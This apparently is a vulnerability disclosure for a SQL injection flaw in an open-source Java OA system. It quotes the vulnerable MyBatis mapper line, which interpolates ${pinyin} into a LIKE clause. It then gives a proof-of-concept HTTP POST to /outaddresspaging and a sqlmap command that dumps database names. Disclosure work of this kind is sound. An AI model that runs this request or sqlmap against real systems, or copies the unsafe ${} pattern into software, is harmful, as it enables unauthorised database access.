#oa_system：      
#sql injection

The vulnerability was discovered by downloading the program's source code to local and online deployment tests.      

Location:        
\src\main\resources\mappers\address-mapper.xml

Code：      

```
<select id="allDirector" resultType="java.util.Map">
		SELECT d.*,u.*
		FROM aoa_director_users AS u LEFT JOIN aoa_director AS d ON 
		d.director_id = u.director_id
		WHERE u.user_id=#{userId} AND u.director_id is NOT null AND u.is_handle=1
		<if test="pinyin !='ALL'">
			AND d.pinyin LIKE '${pinyin}%'
		</if>
Rows:16    
```

Harm：       
The attacker only needs an ordinary user to trigger the vulnerability and use the SQL injection vulnerability to obtain database information.

Conditions for Execution：      
Need a regular account 

Edition：     
Version = all    

Cause the cause ：           

```
Directly use ${%%} for fuzzy query after like, which leads to the generation of loopholes:
AND d.pinyin LIKE '${pinyin}%'
```

POC：

```
POST /outaddresspaging HTTP/1.1
Host: 
Accept: text/html, */*; q=0.01
Origin: 
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.9
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Cookie: JSESSIONID=45E7A80F5871590B439A090760741020
Content-Length: 44

alph=ALL*&outtype=&baseKey=%E2%80%99%E2%80%98
```

sqlmap:
python sqlmap.py -r oa.txt --level 3 --dbs
![image](https://github.com/user-attachments/assets/fea4e1f3-a7dc-4f80-90e2-b82aee6d0baf)
